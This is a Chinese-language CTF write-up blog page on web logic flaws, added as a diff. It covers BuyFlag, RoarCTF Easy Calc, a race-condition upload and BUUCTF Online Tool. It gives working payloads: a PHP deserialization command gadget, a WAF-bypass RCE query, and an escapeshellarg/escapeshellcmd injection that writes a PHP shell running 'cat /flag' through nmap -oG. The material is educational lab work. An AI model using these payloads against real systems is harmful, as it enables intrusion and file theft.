@@ -1,0 +1,1062 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web-逻辑漏洞 | 24kmagic</title><meta name="author" content="qyt"><meta name="copyright" content="qyt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web-逻辑漏洞基础脚本： 12345678unserialize($_GET[&#x27;x&#x27;]);class A &#123;    public $cmd;    function __destruct() &#123;        system($this-&gt;cmd);    &#125;&#125;     **多个请求“同时”访问同一份资源， &gt; 程序假设它们是“先后">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web-逻辑漏洞">
+<meta property="og:url" content="https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/index.html">
+<meta property="og:site_name" content="24kmagic">
+<meta property="og:description" content="web-逻辑漏洞基础脚本： 12345678unserialize($_GET[&#x27;x&#x27;]);class A &#123;    public $cmd;    function __destruct() &#123;        system($this-&gt;cmd);    &#125;&#125;     **多个请求“同时”访问同一份资源， &gt; 程序假设它们是“先后">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-01-21T11:39:43.000Z">
+<meta property="article:modified_time" content="2026-01-23T04:49:21.303Z">
+<meta property="article:author" content="qyt">
+<meta property="article:tag" content="web-逻辑漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "web-逻辑漏洞",
+  "url": "https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/",
+  "image": "https://2829750658t-svg.github.io/img/butterfly-icon.png",
+  "datePublished": "2026-01-21T11:39:43.000Z",
+  "dateModified": "2026-01-23T04:49:21.303Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "qyt",
+      "url": "https://2829750658t-svg.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'web-逻辑漏洞',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="google-site-verification" content="xcoxCJdnrLSrFpybmYmk6WSRqz-H1rnZB7BKSjdkWD0" /><meta name="google-site-verification" content="H8Bhbw_EXOKyVq27SUdcn_avXaVqBOWzs2lPJV_HSVw" /><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images/bj2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">24kmagic</span></a><a class="nav-page-title" href="/"><span class="site-name">web-逻辑漏洞</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">web-逻辑漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-21T11:39:43.000Z" title="发表于 2026-01-21 19:39:43">2026-01-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-23T04:49:21.303Z" title="更新于 2026-01-23 12:49:21">2026-01-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/">ctf题解</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="web-逻辑漏洞"><a href="#web-逻辑漏洞" class="headerlink" title="web-逻辑漏洞"></a>web-逻辑漏洞</h2><p>基础脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unserialize($_GET[&#x27;x&#x27;]);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<?php
+class A {
+    public $cmd = "cat /flag";
+}
+echo serialize(new A());
+
+
+
+
+
+
+
+## [极客大挑战 2019]BuyFlag
+
+### 1
+
+题目：我一开始是想去把xff改成学校的特定内网ip，发现根本没有用，因为你不知道ip是啥啊
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Flag</span><br><span class="line"></span><br><span class="line">Flag need your 100000000 money</span><br><span class="line">attention</span><br><span class="line"></span><br><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!!</span><br><span class="line"></span><br><span class="line">Only Cuit&#x27;s students can buy the FLAG</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+由题，没思路，看源码
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">	$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+1.password弱比较
+
+很矛盾的就是密码是要404，但是又不能是数字
+
+这里就要用到==弱比较，即如果等式两边是字符串和整数，会把字符串转化为数字再进行比较。这就好办了：password=404a不就好了
+
+2.科学计数法
+
+![image-20260101182325159](/images/image-20260101182325159.png)
+
+你发现直接输入数字它显示太长了，用科学计数法就ok
+
+这里还要注意的点，就是你把原本的金额填上去，它会显示你钱不够，那你多填点不就好了
+
+3.改cookie：
+
+构造请求中，cookie的参数是-b
+
+![image-20260101182556727](/images/image-20260101182556727.png)
+
+千辛万苦改完了，但是他说你不是他的学生
+
+![image-20260101182624105](/images/image-20260101182624105.png)
+
+这里抓包后看到了user=0，就说明你不是学生嘛，那把值改成1不就真了
+
+来，改cookie
+
+
+
+3.构造请求
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &quot;http://03a3f5cd-0bd7-4be5-bb55-829058bd107b.node5.buuoj.cn:81/pay.php&quot; -d &quot;password=404a&amp;money=1e9&quot; -b &quot;user=1&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## [RoarCTF 2019]Easy Calc
+
+### 1
+
+
+
+知识点：
+
+1. WAF (Web Application Firewall)
+
+2. var_dump()：
+
+**var_dump()** 函数用于输出变量的相关信息。
+
+**var_dump()** 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b = 3.1;</span><br><span class="line">$c = true;</span><br><span class="line">var_dump($b, $c);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出结果为：</span><br><span class="line"></span><br><span class="line">float(3.1)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
+
+![image-20260101194019184](/images/image-20260101194019184.png)
+
+
+
+
+
+**进入正题：**
+
+
+
+先随便输入，抓包得到 `/calc.php?num=1+1`
+
+再输入一些符号*/'',发现都被waf过滤了，会有提示框跳出来警告
+
+
+
+可以看看源代码
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;#calc&#x27;).submit(function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), //输入内容会经过编码放到calc.php里去，这不刚好是我们前面得到的东西吗，那就确定在这个页面下注入了</span><br><span class="line">        type:&#x27;GET&#x27;,</span><br><span class="line">        success:function(data)&#123;</span><br><span class="line">            $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">        &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">        &lt;/div&gt;`);</span><br><span class="line">        &#125;,</span><br><span class="line">        error:function()&#123;</span><br><span class="line">            alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    return false;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+仔细思考，既然是计算器，一般都会用到eval函数，那我们就输入一些东西让php 远程代码执行（rce)，但是有些符号可能会被我们用到，可以考虑用chr()
+
+
+
+
+
+所以直接改url就行了，但是如果你直接输入 num=readfile(文件路径),发现被禁止了（就是我前面说的waf），所以我们要绕过waf
+
+![image-20260101193118587](/images/image-20260101193118587.png)
+
+
+
+对于waf来说，你输入：? num=.....
+
+他看到的是`空格num`，不是num，他就只认num，所以就放过你了
+
+
+
+那么后面正常跟参数就行了
+
+
+
+
+
+![image-20260101185924710](/images/image-20260101185924710.png)
+
+这里500报错说明你已经进入后端（绕过flag了），只是php解析错误了（你语法不正确嘛）
+
+
+
+
+
+
+
+
+
+http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(chr(46)))
+
+http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(char(46)))
+
+46是. 
+
+47是/
+
+
+
+![image-20260101190705612](/images/image-20260101190705612.png)
+
+
+
+
+
+
+
+![image-20260101190756691](/images/image-20260101190756691.png)
+
+
+
+找到了，现在我们要
+
+读取：
+
+file_get_contents()
+
+readfile()
+
+highlight_file()
+
+任选
+
+
+
+
+
+这里因为没有输入路径，只是输入了文件名，所以错了
+
+![image-20260101191116410](/images/image-20260101191116410.png)
+
+
+
+![image-20260101192942012](/images/image-20260101192942012.png)
+
+
+
+## 15 第十五章 归真关·竞时净魔
+
+## 
+
+文件上传？其实是竞争漏洞
+
+讨厌这道题目。什么竞争？？条件竞争
+
+1.上传php虽然失败，但我们抓包可以发送出数次
+
+2.同时抓包打开uploads/对应文件名，发送无数次
+
+3.观察响应，成功上传后就ok
+
+
+
+##  **竞态条件（Race Condition）**
+
+### 什么是 Race Condition？
+
+> **多个请求“同时”访问同一份资源，
+> 程序假设它们是“先后执行”，
+> 但现实中它们发生了“时间重叠”，
+> 导致逻辑被打乱。**
+
+一句话版：
+
+> **程序没加锁，你来抢时间。**
+
+
+
+A：刚把纸放下
+B：手刚伸过来想删掉
+我：眼睛已经看到了
+
+
+
+👉 **“文件存在但还没被删”的极短时间窗口**
+ 就是漏洞窗口。
+
+
+
+
+
+
+
+
+
+
+
+## [BUUCTF 2018]Online Tool
+
+### 1
+
+
+
+| 字符类型       | 具体字符                                                     | `escapeshellcmd()`的处理方式           |      |
+| -------------- | ------------------------------------------------------------ | -------------------------------------- | ---- |
+| shell 特殊字符 | `& ;                | $ ( ) ` * ? < >`                       | 加 `\` 转义（比如 `&`→`\&`） |                                        |      |
+| 普通字符       | `' " / . 数字 字母`                                          | 不转义；如果前面有`\`，直接删`\`留字符 |      |
+
+
+
+
+
+
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 第一步：伪造客户端IP（关键铺垫）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解释：</span></span><br><span class="line"><span class="comment">// HTTP_X_FORWARDED_FOR是请求头，可伪造（比如用Burp/PostMan改）；</span></span><br><span class="line"><span class="comment">// 这行代码的意思是：如果有这个请求头，就把客户端真实IP替换成这个头的值；</span></span><br><span class="line"><span class="comment">// 目的：后面生成沙箱目录依赖REMOTE_ADDR，我们可以通过改这个请求头控制沙箱名称。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二步：判断是否传了host参数</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 没传host的话，显示当前代码源码</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 第三步：处理host参数（看似过滤，实则有坑）</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];          <span class="comment">// 获取URL里的?host=xxx参数</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);  <span class="comment">// 把参数用单引号包裹+转义单引号（比如把&#x27;变成\&#x27;）   注意顺序！！！1</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);  <span class="comment">// 转义命令行特殊字符（比如&amp;;|`$()等）</span></span><br><span class="line">    <span class="comment">//总之，arg+cmd，先转义&#x27;，又拆掉转义，做了跟没做一样，不用管他</span></span><br><span class="line">    </span><br><span class="line">    举例：</span><br><span class="line">        传入  <span class="number">172.17</span>.<span class="number">0.2</span><span class="string">&#x27; -v -d a=1</span></span><br><span class="line"><span class="string">        经过escapeshellarg， 变成 &#x27;</span><span class="number">172.17</span>.<span class="number">0.2</span>\<span class="string">&#x27; -v -d a=1&#x27;</span></span><br><span class="line">        经过escapeshellacmd， 变成 <span class="string">&#x27;172.17.0.2&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 第四步：生成并进入沙箱目录</span></span><br><span class="line"><span class="string">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;</span>REMOTE_ADDR<span class="string">&#x27;]); // 用固定字符串+IP做MD5，生成唯一目录名</span></span><br><span class="line"><span class="string">    echo &#x27;</span>you are in sandbox <span class="string">&#x27;.$sandbox; // 输出沙箱名称</span></span><br><span class="line"><span class="string">    @mkdir($sandbox); // 创建沙箱目录（@屏蔽报错，比如目录已存在）</span></span><br><span class="line"><span class="string">    chdir($sandbox);  // 进入这个沙箱目录（后续命令都在这个目录执行）</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //chdir($sandbox)的本质就是 “进入这个沙箱目录”，而 “进入” 的底层实现，就是操作系统把当前进程的「默认工作目录」改成这个目录</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 第五步：执行nmap命令并输出结果</span></span><br><span class="line"><span class="string">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //通过 PHP 的字符串拼接符 . ，直接贴到-F后面</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //输入：</span></span><br><span class="line"><span class="string">    //127.0.0.1&#x27;</span> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> `cat /flag`;<span class="meta">?&gt;</span> -oG test.php <span class="string">&#x27;</span></span><br><span class="line"><span class="string">    //arg:</span></span><br><span class="line"><span class="string">    //&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span>/<span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php /&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    //cmd:</span></span><br><span class="line"><span class="string">    //&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //拼接：</span></span><br><span class="line"><span class="string">    //nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //nmap 命令实际执行逻辑：</span></span><br><span class="line"><span class="string">    //1.nmap 会把&#x27;</span><span class="string">&#x27;当成空参数，忽略；</span></span><br><span class="line"><span class="string">    //2.-oG是 nmap 的合法参数，作用是 “把扫描结果输出到 test.php 文件”；</span></span><br><span class="line"><span class="string">    //3. &lt;?php echo cat /flag;?&gt; 会被 nmap 当成 “扫描目标”，最终和 nmap 的扫描日志一起写入 test.php 文件；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // 解释：</span></span><br><span class="line"><span class="string">    // system()会执行拼接后的命令，并把结果输出到页面；</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+1.输入
+
+payload1
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure>
+
+payload2
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php #</span><br></pre></td></tr></table></figure>
+
+
+
+2.得到沙箱
+
+![image-20251220205145783](/images/image-20251220205145783.png)
+
+
+
+
+
+3.访问沙箱下面的test.php
+
+
+
+![image-20251220205251772](/images/image-20251220205251772.png)
+
+
+
+
+
+知识点总结：
+
+1.关于前后单引号
+
+127.0.0.1' <?php echo `cat /flag`;?><p> -oG test.php ‘</p>
+<p>因为经过arg，整个host会被包裹上单引号，所以为了避免语法错误，我们需要前面少一个单引号，后面多一个单引号给他闭合掉</p>
+<p>2.关于127.0.0.1</p>
+<p>nmap必须要有一个扫描的目标，所以必须填写</p>
+<p>3.<strong>nmap参数<code>-oG</code>:将命令和结果写到文件</strong></p>
+<p>直接写入命令 cat &#x2F;flag</p>
+<p>&#x2F;：根目录下</p>
+<p>&#96;&#96;:php语法中，反引号把字符串变成可执行系统命令；    没有它，你的代码只是打印文字，不是执行读文件的命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>4.<strong>R</strong>emote <strong>C</strong>ode <strong>E</strong>xecution</p>
+<p><strong>远程代码执行（Remote Code Execution，RCE）</strong> 是一种严重的安全漏洞，允许攻击者在目标系统上执行任意代码或命令。</p>
+<p>RCE漏洞的原理</p>
+<p>RCE漏洞的产生通常是因为应用程序提供了执行系统命令或代码的接口，而这些接口没有对用户输入进行严格的过滤。例如，某些网络设备（如路由器、防火墙、入侵检测系统）的Web管理界面允许用户输入IP地址进行ping操作。如果没有对输入进行严格的验证，攻击者可以通过该接口注入恶意命令，从而控制后台服务器。</p>
+<p>RCE漏洞的危害</p>
+<ol>
+<li><strong>执行系统命令</strong>：攻击者可以执行任意系统命令，获取系统信息或执行恶意操作。</li>
+<li><strong>读取和写入文件</strong>：攻击者可以读取或修改服务器上的文件，获取敏感信息或篡改数据。</li>
